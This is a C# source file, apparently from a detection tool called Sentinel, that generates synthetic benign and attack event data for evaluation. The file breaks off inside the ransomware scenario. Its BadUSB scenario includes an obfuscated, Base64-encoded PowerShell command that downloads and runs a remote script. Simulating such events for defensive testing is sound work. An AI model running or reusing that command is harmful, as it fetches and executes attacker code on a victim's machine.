using System.Globalization;
using Sentinel.Shared.Models;

namespace Sentinel.Simulation.Scenarios;

/// <summary>
/// Catalogue déterministe des 8 scénarios d'attaque réalistes et du corpus de trafic bénin (220+ événements).
/// Tous les événements utilisent strictement <see cref="EventTypes"/> et <see cref="AttributeKeys"/> de Sentinel.Shared.
/// </summary>
public static class ScenarioCatalog
{
    /// <summary>Empreinte SHA-256 standard du fichier de test antivirus inoffensif EICAR (doc §14.1).</summary>
    public const string EicarSha256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f";

    public const string DefaultEvalHostId = "WS-EVAL-01";
    public const string DefaultEvalUserId = "alice.mbarga";

    /// <summary>
    /// Génère un corpus réaliste d'au moins 220 événements bénins couvrant une journée de travail
    /// normale (08h30–17h30) : processus signés Microsoft/Google/Mozilla, navigation vers domaines habituels,
    /// fichiers bureautiques basse entropie, frappe humaine normale (~5 touches/s, σ ≈ 45 ms) et sessions.
    /// </summary>
    public static IReadOnlyList<SecurityEvent> BuildBenignCorpus(
        string hostId = DefaultEvalHostId,
        string userId = DefaultEvalUserId,
        DateTimeOffset? referenceDay = null)
    {
        var day = (referenceDay ?? new DateTimeOffset(2026, 4, 15, 0, 0, 0, TimeSpan.Zero)).Date;
        var baseStart = new DateTimeOffset(day.Year, day.Month, day.Day, 8, 30, 0, TimeSpan.Zero);
        var events = new List<SecurityEvent>(240);

        // 1. Ouverture de session matinale normale (09h00) + cycle de journée
        var tLogon = new DateTimeOffset(day.Year, day.Month, day.Day, 9, 0, 0, TimeSpan.Zero);
        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.LogonSuccess, userId,
            new Dictionary<string, string>
            {
                [AttributeKeys.WindowsEventId] = "4624",
                [AttributeKeys.LogonType] = "2",
                [AttributeKeys.SourceIp] = "127.0.0.1",
                [AttributeKeys.TargetUser] = userId,
                [AttributeKeys.SessionId] = "1"
            },
            timestamp: tLogon));

        // 2. Processus légitimes signés Microsoft / Google / Mozilla (50 événements)
        (string Name, string Path, string Publisher, string Parent)[] trustedProcesses =
        [
            ("explorer.exe", @"C:\Windows\explorer.exe", "Microsoft Windows", "userinit.exe"),
            ("WINWORD.EXE", @"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", "Microsoft Corporation", "explorer.exe"),
            ("EXCEL.EXE", @"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE", "Microsoft Corporation", "explorer.exe"),
            ("OUTLOOK.EXE", @"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", "Microsoft Corporation", "explorer.exe"),
            ("chrome.exe", @"C:\Program Files\Google\Chrome\Application\chrome.exe", "Google LLC", "explorer.exe"),
            ("msedge.exe", @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "Microsoft Corporation", "explorer.exe"),
            ("firefox.exe", @"C:\Program Files\Mozilla Firefox\firefox.exe", "Mozilla Corporation", "explorer.exe"),
            ("notepad.exe", @"C:\Windows\System32\notepad.exe", "Microsoft Windows", "explorer.exe"),
            ("Teams.exe", @"C:\Program Files\WindowsApps\MSTeams\Teams.exe", "Microsoft Corporation", "explorer.exe"),
            ("Code.exe", @"C:\Program Files\Microsoft VS Code\Code.exe", "Microsoft Corporation", "explorer.exe")
        ];

        for (var i = 0; i < 50; i++)
        {
            var p = trustedProcesses[i % trustedProcesses.Length];
            var ts = baseStart.AddMinutes(i * 10);
            var pid = 2100 + i;
            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, p.Path,
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = pid.ToString(CultureInfo.InvariantCulture),
                    [AttributeKeys.ProcessName] = p.Name,
                    [AttributeKeys.ProcessPath] = p.Path,
                    [AttributeKeys.ParentProcessName] = p.Parent,
                    [AttributeKeys.Signed] = "true",
                    [AttributeKeys.Publisher] = p.Publisher,
                    [AttributeKeys.Elevated] = "false"
                },
                timestamp: ts));
        }

        // 3. Navigation & connexions réseau vers domaines habituels (64 événements)
        (string Domain, string Url, string Ip, string AgeDays)[] habitualSites =
        [
            ("github.com", "https://github.com/sentinel-org/documentation", "140.82.121.4", "6500"),
            ("microsoft.com", "https://www.microsoft.com/fr-fr/security", "20.112.250.133", "10500"),
            ("wikipedia.org", "https://fr.wikipedia.org/wiki/Syst%C3%A8me_de_d%C3%A9tection_d%27intrusion", "185.15.58.224", "9100"),
            ("learn.microsoft.com", "https://learn.microsoft.com/fr-fr/dotnet/core/", "23.214.172.18", "10500"),
            ("office.com", "https://www.office.com/launch/word", "52.96.165.130", "9800"),
            ("stackoverflow.com", "https://stackoverflow.com/questions/tagged/csharp", "104.18.32.7", "6400"),
            ("linkedin.com", "https://www.linkedin.com/feed/", "13.107.42.14", "8200"),
            ("intranet.entreprise.local", "https://intranet.entreprise.local/rh/conges", "10.10.4.25", "3200")
        ];

        for (var i = 0; i < 32; i++)
        {
            var site = habitualSites[i % habitualSites.Length];
            var ts = baseStart.AddMinutes(15 + i * 15);
            var browser = i % 3 == 0 ? "msedge" : (i % 3 == 1 ? "chrome" : "firefox");

            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.UrlVisited, site.Url,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = site.Url,
                    [AttributeKeys.Domain] = site.Domain,
                    [AttributeKeys.DomainAgeDays] = site.AgeDays,
                    [AttributeKeys.RedirectCount] = "0",
                    [AttributeKeys.IsShortener] = "false",
                    [AttributeKeys.Browser] = browser,
                    [AttributeKeys.TabId] = $"benign-tab-{i % 6}"
                },
                timestamp: ts));

            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Network, EventTypes.NetworkConnection, site.Domain,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Domain] = site.Domain,
                    [AttributeKeys.RemoteIp] = site.Ip,
                    [AttributeKeys.RemotePort] = "443",
                    [AttributeKeys.Protocol] = "tcp",
                    [AttributeKeys.Direction] = "outbound",
                    [AttributeKeys.IsPrivateIp] = site.Ip.StartsWith("10.", StringComparison.Ordinal) ? "true" : "false",
                    [AttributeKeys.BytesSent] = (14_000 + (i % 8) * 9_500).ToString(CultureInfo.InvariantCulture),
                    [AttributeKeys.BytesReceived] = (180_000 + (i % 5) * 45_000).ToString(CultureInfo.InvariantCulture),
                    [AttributeKeys.DomainAgeDays] = site.AgeDays,
                    [AttributeKeys.ProcessName] = browser + ".exe"
                },
                timestamp: ts.AddSeconds(2)));
        }

        // 4. Fichiers bureautiques basse entropie (56 événements)
        (string FileName, string Ext, string Entropy, long Size, string Folder)[] officeFiles =
        [
            ("compte_rendu_reunion.docx", ".docx", "4.35", 84_500, WatchedFolders.Documents),
            ("suivi_budget_q2.xlsx", ".xlsx", "4.62", 128_400, WatchedFolders.Documents),
            ("notes_projet_sentinel.txt", ".txt", "3.85", 12_300, WatchedFolders.Documents),
            ("presentation_direction.pptx", ".pptx", "5.10", 640_000, WatchedFolders.Documents),
            ("planning_equipe.csv", ".csv", "3.92", 24_800, WatchedFolders.Desktop),
            ("procedure_interne.pdf", ".pdf", "5.40", 412_000, WatchedFolders.Documents),
            ("liste_fournisseurs.xlsx", ".xlsx", "4.48", 96_200, WatchedFolders.Documents),
            ("rapport_mensuel.docx", ".docx", "4.20", 156_000, WatchedFolders.Desktop)
        ];

        for (var i = 0; i < 56; i++)
        {
            var f = officeFiles[i % officeFiles.Length];
            var ts = baseStart.AddMinutes(20 + i * 9);
            var folderPath = f.Folder == WatchedFolders.Desktop ? "Desktop" : "Documents";
            var fullPath = $@"C:\Users\{userId}\{folderPath}\{f.FileName}";
            var evtType = i % 3 == 0 ? EventTypes.FileCreated : EventTypes.FileModified;

            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.File, evtType, fullPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = fullPath,
                    [AttributeKeys.FileName] = f.FileName,
                    [AttributeKeys.Extension] = f.Ext,
                    [AttributeKeys.FileSize] = f.Size.ToString(CultureInfo.InvariantCulture),
                    [AttributeKeys.Entropy] = f.Entropy,
                    [AttributeKeys.DoubleExtension] = "false",
                    [AttributeKeys.IsExecutable] = "false",
                    [AttributeKeys.IsArchive] = "false",
                    [AttributeKeys.WatchedFolder] = f.Folder
                },
                timestamp: ts));
        }

        // 5. Dynamique de saisie humaine normale (~5 touches/s, σ ≈ 45 ms) — 36 échantillons
        double[] humanKps = [4.4, 4.8, 5.1, 5.3, 4.9, 5.5, 4.6, 5.2, 5.0, 4.7, 5.4, 4.9];
        double[] humanStd = [41.2, 46.8, 44.5, 48.1, 42.9, 51.0, 39.7, 45.3, 47.4, 43.6, 49.2, 44.0];
        for (var i = 0; i < 36; i++)
        {
            var kps = humanKps[i % humanKps.Length];
            var std = humanStd[i % humanStd.Length];
            var meanMs = 1000.0 / kps;
            var ts = baseStart.AddMinutes(32 + i * 14);

            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Typing, EventTypes.TypingStats, "TypingRhythm",
                new Dictionary<string, string>
                {
                    [AttributeKeys.KeysPerSecond] = kps.ToString("F2", CultureInfo.InvariantCulture),
                    [AttributeKeys.MeanIntervalMs] = meanMs.ToString("F1", CultureInfo.InvariantCulture),
                    [AttributeKeys.IntervalStdDevMs] = std.ToString("F1", CultureInfo.InvariantCulture),
                    [AttributeKeys.SampleSize] = (48 + (i % 5) * 8).ToString(CultureInfo.InvariantCulture),
                    [AttributeKeys.Injected] = "false"
                },
                timestamp: ts));
        }

        // 6. Presse-papiers bénin (URLs connues) & événements de session habituels (13 événements)
        for (var i = 0; i < 8; i++)
        {
            var site = habitualSites[i % 4];
            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Clipboard, EventTypes.ClipboardUrl, site.Url,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = site.Url,
                    [AttributeKeys.Domain] = site.Domain,
                    [AttributeKeys.IsShortener] = "false",
                    [AttributeKeys.ContentType] = "url",
                    [AttributeKeys.ContentHash] = $"benign-clip-hash-{i:D2}",
                    [AttributeKeys.DomainAgeDays] = site.AgeDays
                },
                timestamp: baseStart.AddMinutes(45 + i * 55)));
        }

        // Une erreur isolée de saisie de mot de passe en journée (bruit réaliste ne devant PAS lever de faux positif)
        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.LogonFailure, userId,
            new Dictionary<string, string>
            {
                [AttributeKeys.WindowsEventId] = "4625",
                [AttributeKeys.LogonType] = "2",
                [AttributeKeys.SourceIp] = "127.0.0.1",
                [AttributeKeys.TargetUser] = userId,
                [AttributeKeys.FailureReason] = "0xC000006A",
                [AttributeKeys.FailureCount] = "1"
            },
            timestamp: new DateTimeOffset(day.Year, day.Month, day.Day, 13, 12, 0, TimeSpan.Zero)));

        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.SessionLocked, userId,
            new Dictionary<string, string> { [AttributeKeys.WindowsEventId] = "4800" },
            timestamp: new DateTimeOffset(day.Year, day.Month, day.Day, 12, 15, 0, TimeSpan.Zero)));

        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.SessionUnlocked, userId,
            new Dictionary<string, string> { [AttributeKeys.WindowsEventId] = "4801" },
            timestamp: new DateTimeOffset(day.Year, day.Month, day.Day, 13, 13, 0, TimeSpan.Zero)));

        events.Add(SecurityEvent.Create(
            hostId, userId, EventCategory.Session, EventTypes.Logoff, userId,
            new Dictionary<string, string> { [AttributeKeys.WindowsEventId] = "4634" },
            timestamp: new DateTimeOffset(day.Year, day.Month, day.Day, 17, 30, 0, TimeSpan.Zero)));

        // 7. Activité bénigne étendue sur 24 h (nuit 00h00–08h00 + soirée 18h00–23h55) :
        //    mises à jour Windows/Defender signées, synchronisation OneDrive, tâches d'indexation,
        //    résolutions DNS légitimes et blocs PowerShell d'administration bénins (sans obfuscation)
        //    → porte le corpus témoin à ~480+ événements couvrant une journée complète de 24 h.
        var dayStart = new DateTimeOffset(day.Year, day.Month, day.Day, 0, 5, 0, TimeSpan.Zero);
        (string Name, string Path, string Publisher)[] backgroundSigned =
        [
            ("MsMpEng.exe", @"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", "Microsoft Windows"),
            ("SearchIndexer.exe", @"C:\Windows\System32\SearchIndexer.exe", "Microsoft Windows"),
            ("OneDrive.exe", @"C:\Program Files\Microsoft OneDrive\OneDrive.exe", "Microsoft Corporation"),
            ("UsoClient.exe", @"C:\Windows\System32\UsoClient.exe", "Microsoft Windows"),
            ("svchost.exe", @"C:\Windows\System32\svchost.exe", "Microsoft Windows"),
            ("dotnet.exe", @"C:\Program Files\dotnet\dotnet.exe", "Microsoft Corporation")
        ];
        (string Domain, string Ip)[] maintenanceSites =
        [
            ("windowsupdate.com", "20.190.159.4"),
            ("microsoft.com", "20.112.250.133"),
            ("github.com", "140.82.121.4"),
            ("office.com", "52.96.165.130")
        ];

        for (var h = 0; h < 24; h++)
        {
            for (var slot = 0; slot < 4; slot++)
            {
                var ts = dayStart.AddHours(h).AddMinutes(slot * 14);
                var bg = backgroundSigned[(h * 4 + slot) % backgroundSigned.Length];
                var site = maintenanceSites[(h + slot) % maintenanceSites.Length];

                events.Add(SecurityEvent.Create(
                    hostId, "SYSTEM", EventCategory.Process, EventTypes.ProcessStart, bg.Path,
                    new Dictionary<string, string>
                    {
                        [AttributeKeys.ProcessId] = (3200 + h * 10 + slot).ToString(CultureInfo.InvariantCulture),
                        [AttributeKeys.ProcessName] = bg.Name,
                        [AttributeKeys.ProcessPath] = bg.Path,
                        [AttributeKeys.ParentProcessName] = "services.exe",
                        [AttributeKeys.Signed] = "true",
                        [AttributeKeys.Publisher] = bg.Publisher,
                        [AttributeKeys.Elevated] = "false"
                    },
                    timestamp: ts));

                events.Add(SecurityEvent.Create(
                    hostId, "SYSTEM", EventCategory.Network, EventTypes.NetworkConnection, site.Domain,
                    new Dictionary<string, string>
                    {
                        [AttributeKeys.Domain] = site.Domain,
                        [AttributeKeys.RemoteIp] = site.Ip,
                        [AttributeKeys.RemotePort] = "443",
                        [AttributeKeys.Protocol] = "tcp",
                        [AttributeKeys.Direction] = "outbound",
                        [AttributeKeys.IsPrivateIp] = "false",
                        [AttributeKeys.BytesSent] = (4_200 + slot * 1_800).ToString(CultureInfo.InvariantCulture),
                        [AttributeKeys.BytesReceived] = (92_000 + slot * 12_000).ToString(CultureInfo.InvariantCulture),
                        [AttributeKeys.DomainAgeDays] = "9500",
                        [AttributeKeys.ProcessName] = bg.Name
                    },
                    timestamp: ts.AddSeconds(3)));
            }

            // Bloc de script PowerShell bénin (ex. vérification de profil ou Get-Service sans aucun indicateur suspect)
            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.Script, EventTypes.PowerShellScriptBlock, $"ps-profile-check-{h:D2}",
                new Dictionary<string, string>
                {
                    [AttributeKeys.WindowsEventId] = "4104",
                    [AttributeKeys.ScriptBlockId] = $"ps-profile-check-{h:D2}",
                    [AttributeKeys.ScriptLength] = "142",
                    [AttributeKeys.Entropy] = "4.10",
                    [AttributeKeys.ScriptObfuscationScore] = "5",
                    [AttributeKeys.ScriptIndicators] = string.Empty,
                    [AttributeKeys.ScriptHash] = $"benign-ps-hash-{h:D2}00000000000000000000000000000000000000000000000000"
                },
                timestamp: dayStart.AddHours(h).AddMinutes(25)));

            // Mise à jour de journal ou cache bureautique bénin basse entropie
            var docPath = $@"C:\Users\{userId}\Documents\journal_activite_{h:D2}.txt";
            events.Add(SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileModified, docPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = docPath,
                    [AttributeKeys.FileName] = $"journal_activite_{h:D2}.txt",
                    [AttributeKeys.Extension] = ".txt",
                    [AttributeKeys.FileSize] = "6400",
                    [AttributeKeys.Entropy] = "3.95",
                    [AttributeKeys.DoubleExtension] = "false",
                    [AttributeKeys.IsExecutable] = "false",
                    [AttributeKeys.IsArchive] = "false",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents
                },
                timestamp: dayStart.AddHours(h).AddMinutes(40)));
        }

        events.Sort((a, b) => a.Timestamp.CompareTo(b.Timestamp));
        return events;
    }

    /// <summary>
    /// Retourne les 11 scénarios d'attaque réalistes complets (8 scénarios v1 + 3 scénarios v2 :
    /// Affaiblissement Defender + LOLBin, Piège Canari anti-ransomware, Script PowerShell 4104 obfusqué).
    /// </summary>
    public static IReadOnlyList<AttackScenario> BuildAttackScenarios(
        string hostId = DefaultEvalHostId,
        string userId = DefaultEvalUserId,
        DateTimeOffset? referenceDay = null)
    {
        var day = (referenceDay ?? new DateTimeOffset(2026, 4, 16, 0, 0, 0, TimeSpan.Zero)).Date;

        return
        [
            BuildScenario1Phishing(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 10, 15, 0, TimeSpan.Zero)),
            BuildScenario2BadUsb(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 11, 5, 0, TimeSpan.Zero)),
            BuildScenario3Ransomware(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 11, 40, 0, TimeSpan.Zero)),
            BuildScenario4Exfiltration(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 14, 20, 0, TimeSpan.Zero)),
            BuildScenario5BruteForce(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 3, 14, 10, TimeSpan.Zero)),
            BuildScenario6Persistence(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 15, 10, 0, TimeSpan.Zero)),
            BuildScenario7SocialEngineering(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 0, 0, TimeSpan.Zero)),
            BuildScenario8Eicar(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 30, 0, TimeSpan.Zero)),
            BuildScenario9DefenderWeakening(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 16, 50, 0, TimeSpan.Zero)),
            BuildScenario10CanaryTrap(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 17, 5, 0, TimeSpan.Zero)),
            BuildScenario11ScriptObfuscation(hostId, userId, new DateTimeOffset(day.Year, day.Month, day.Day, 17, 20, 0, TimeSpan.Zero))
        ];
    }

    /// <summary>
    /// Scénario 1 — Phishing → exécution (T1566.002, T1204, T1071) :
    /// copie d'URL raccourcie (bit.ly) → ouverture navigateur → téléchargement exécutable (facture_2026.pdf.exe)
    /// → lancement processus non signé depuis Downloads → connexion sortante vers IP publique rare.
    /// </summary>
    public static AttackScenario BuildScenario1Phishing(string hostId, string userId, DateTimeOffset t0)
    {
        const string shortUrl = "https://bit.ly/facture-avril-2026";
        const string fileName = "facture_2026.pdf.exe";
        var filePath = $@"C:\Users\{userId}\Downloads\{fileName}";
        const string fakeSha = "c4d8e910f12a34b56c78d90e12f34a56b78c90d12e34f56a78b90c12d34e56f1";
        const string tabId = "tab-phish-401";
        const string pid = "4820";

        var events = new List<SecurityEvent>
        {
            // 1. Copie URL raccourcie dans le presse-papiers
            SecurityEvent.Create(
                hostId, userId, EventCategory.Clipboard, EventTypes.ClipboardUrl, shortUrl,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = shortUrl,
                    [AttributeKeys.Domain] = "bit.ly",
                    [AttributeKeys.IsShortener] = "true",
                    [AttributeKeys.ContentType] = "url",
                    [AttributeKeys.ContentHash] = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
                },
                correlationHints: $"url:{shortUrl},domain:bit.ly",
                timestamp: t0),

            // 2. Ouverture du lien raccourci dans le navigateur (+6 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.UrlVisited, shortUrl,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = shortUrl,
                    [AttributeKeys.Domain] = "bit.ly",
                    [AttributeKeys.IsShortener] = "true",
                    [AttributeKeys.Browser] = "msedge",
                    [AttributeKeys.TabId] = tabId,
                    [AttributeKeys.Referrer] = "clipboard"
                },
                correlationHints: $"url:{shortUrl},domain:bit.ly",
                timestamp: t0.AddSeconds(6)),

            // 3. Téléchargement d'un exécutable à double extension (+18 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Browser, EventTypes.DownloadStarted, fileName,
                new Dictionary<string, string>
                {
                    [AttributeKeys.Url] = "https://cdn-factures-eu.net/dl/facture_2026.pdf.exe",
                    [AttributeKeys.Domain] = "cdn-factures-eu.net",
                    [AttributeKeys.FileName] = fileName,
                    [AttributeKeys.FilePath] = filePath,
                    [AttributeKeys.Extension] = ".exe",
                    [AttributeKeys.DoubleExtension] = "true",
                    [AttributeKeys.IsExecutable] = "true",
                    [AttributeKeys.Browser] = "msedge",
                    [AttributeKeys.TabId] = tabId,
                    [AttributeKeys.Sha256] = fakeSha
                },
                correlationHints: $"file:{fileName},tab:{tabId}",
                timestamp: t0.AddSeconds(18)),

            // 4. Lancement du processus non signé depuis Downloads (+42 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, filePath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = fileName,
                    [AttributeKeys.ProcessPath] = filePath,
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.DoubleExtension] = "true",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Downloads,
                    [AttributeKeys.Sha256] = fakeSha
                },
                correlationHints: $"file:{fileName},hash:{fakeSha}",
                timestamp: t0.AddSeconds(42)),

            // 5. Connexion sortante vers IP publique rare sur port C2 (+49 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Network, EventTypes.NetworkConnection, "185.220.101.47:4444",
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = fileName,
                    [AttributeKeys.RemoteIp] = "185.220.101.47",
                    [AttributeKeys.RemotePort] = "4444",
                    [AttributeKeys.Protocol] = "tcp",
                    [AttributeKeys.Direction] = "outbound",
                    [AttributeKeys.IsPrivateIp] = "false",
                    [AttributeKeys.BytesSent] = "12400",
                    [AttributeKeys.BytesReceived] = "64200"
                },
                correlationHints: $"pid:{pid},ip:185.220.101.47",
                timestamp: t0.AddSeconds(49))
        };

        return new AttackScenario(
            "S1",
            "1. Phishing → exécution",
            "Copie d'URL raccourcie bit.ly → ouverture navigateur → téléchargement facture_2026.pdf.exe → exécution non signée depuis Downloads → C2 sur IP publique rare.",
            ["T1566.002", "T1204", "T1071"],
            ThreatType.Phishing,
            "CHAIN-PHISHING",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 2 — BadUSB (T1200, T1056, T1059.001) :
    /// insertion clé USB HID clavier inconnue → rafale de saisie injectée (amorce + 75 touches/s, σ = 1.5 ms)
    /// → lancement powershell.exe -enc ...
    /// </summary>
    public static AttackScenario BuildScenario2BadUsb(string hostId, string userId, DateTimeOffset t0)
    {
        const string deviceId = @"USB\VID_1D50&PID_602B\HID_KB_UNKNOWN_01";
        const string encodedCmd = "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA";

        var events = new List<SecurityEvent>
        {
            // 1. Insertion d'une clé USB se présentant comme clavier HID inconnu
            SecurityEvent.Create(
                hostId, userId, EventCategory.Device, EventTypes.UsbInserted, deviceId,
                new Dictionary<string, string>
                {
                    [AttributeKeys.DeviceId] = deviceId,
                    [AttributeKeys.VendorId] = "1D50",
                    [AttributeKeys.ProductId] = "602B",
                    [AttributeKeys.DeviceClass] = "HID",
                    [AttributeKeys.DeviceName] = "Generic USB HID Keyboard",
                    [AttributeKeys.IsKeyboard] = "true",
                    [AttributeKeys.IsStorage] = "false"
                },
                correlationHints: $"device:{deviceId}",
                timestamp: t0),

            // 2. Amorce rapide de saisie (Win+R + "powershell") juste après l'insertion HID (+2 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Typing, EventTypes.TypingStats, "TypingRhythm",
                new Dictionary<string, string>
                {
                    [AttributeKeys.KeysPerSecond] = "22.5",
                    [AttributeKeys.MeanIntervalMs] = "44.4",
                    [AttributeKeys.IntervalStdDevMs] = "11.2",
                    [AttributeKeys.SampleSize] = "12",
                    [AttributeKeys.Injected] = "false"
                },
                timestamp: t0.AddSeconds(2)),

            // 3. Rafale de saisie injectée robotique 75 touches/s, écart-type 1.5 ms (+5 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Typing, EventTypes.TypingStats, "TypingRhythm",
                new Dictionary<string, string>
                {
                    [AttributeKeys.KeysPerSecond] = "75.0",
                    [AttributeKeys.MeanIntervalMs] = "13.3",
                    [AttributeKeys.IntervalStdDevMs] = "1.5",
                    [AttributeKeys.SampleSize] = "64",
                    [AttributeKeys.Injected] = "true"
                },
                timestamp: t0.AddSeconds(5)),

            // 4. Lancement de powershell.exe avec commande Base64 encodée (+8 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = "5932",
                    [AttributeKeys.ProcessName] = "powershell.exe",
                    [AttributeKeys.ProcessPath] = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.CommandLine] = encodedCmd,
                    [AttributeKeys.Signed] = "true",
                    [AttributeKeys.Publisher] = "Microsoft Windows"
                },
                timestamp: t0.AddSeconds(8))
        };

        return new AttackScenario(
            "S2",
            "2. BadUSB (HID → PowerShell)",
            "Insertion d'un périphérique USB HID clavier inconnu → rafale de saisie injectée (75 touches/s, σ = 1,5 ms) → lancement de powershell.exe -enc.",
            ["T1200", "T1056", "T1059.001"],
            ThreatType.BadUsb,
            "CHAIN-BADUSB",
            IsMultiStageChain: true,
            events);
    }

    /// <summary>
    /// Scénario 3 — Ransomware simulé (T1486) :
    /// processus inconnu dans Temp → modification haute entropie → renommage .locked → rafale FileBurst dans Documents.
    /// </summary>
    public static AttackScenario BuildScenario3Ransomware(string hostId, string userId, DateTimeOffset t0)
    {
        var procPath = $@"C:\Users\{userId}\AppData\Local\Temp\svcupdater_tmp.exe";
        var doc1 = $@"C:\Users\{userId}\Documents\budget_2026.docx";
        var doc1Locked = doc1 + ".locked";
        const string pid = "6412";

        var events = new List<SecurityEvent>
        {
            // 1. Exécution d'un binaire non signé depuis Temp
            SecurityEvent.Create(
                hostId, userId, EventCategory.Process, EventTypes.ProcessStart, procPath,
                new Dictionary<string, string>
                {
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "svcupdater_tmp.exe",
                    [AttributeKeys.ProcessPath] = procPath,
                    [AttributeKeys.ParentProcessName] = "explorer.exe",
                    [AttributeKeys.Signed] = "false",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Temp,
                    [AttributeKeys.Sha256] = "b2f4e6a8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b6c8d0e2f4"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0),

            // 2. Première écriture haute entropie (chiffrement) dans Documents (+4 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileModified, doc1,
                new Dictionary<string, string>
                {
                    [AttributeKeys.FilePath] = doc1,
                    [AttributeKeys.FileName] = "budget_2026.docx",
                    [AttributeKeys.Extension] = ".docx",
                    [AttributeKeys.FileSize] = "245760",
                    [AttributeKeys.Entropy] = "7.88",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents,
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "svcupdater_tmp.exe"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0.AddSeconds(4)),

            // 3. Renommage en .locked dans Documents (+9 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileRenamed, doc1Locked,
                new Dictionary<string, string>
                {
                    [AttributeKeys.OldFilePath] = doc1,
                    [AttributeKeys.FilePath] = doc1Locked,
                    [AttributeKeys.FileName] = "budget_2026.docx.locked",
                    [AttributeKeys.OldExtension] = ".docx",
                    [AttributeKeys.Extension] = ".locked",
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents,
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "svcupdater_tmp.exe"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0.AddSeconds(9)),

            // 4. Rafale massive de modifications haute entropie (FileBurst, +15 s)
            SecurityEvent.Create(
                hostId, userId, EventCategory.File, EventTypes.FileBurst, $@"C:\Users\{userId}\Documents",
                new Dictionary<string, string>
                {
                    [AttributeKeys.WatchedFolder] = WatchedFolders.Documents,
                    [AttributeKeys.BurstCount] = "48",
                    [AttributeKeys.BurstWindowSeconds] = "10",
                    [AttributeKeys.BurstAvgEntropy] = "7.91",
                    [AttributeKeys.BurstDistinctExtensions] = "4",
                    [AttributeKeys.ProcessId] = pid,
                    [AttributeKeys.ProcessName] = "svcupdater_tmp.exe"
                },
                correlationHints: $"pid:{pid}",
                timestamp: t0.AddSeconds(15))
        };

        return new AttackScenario(
            "S3",
            "3. Ransomware simulé",
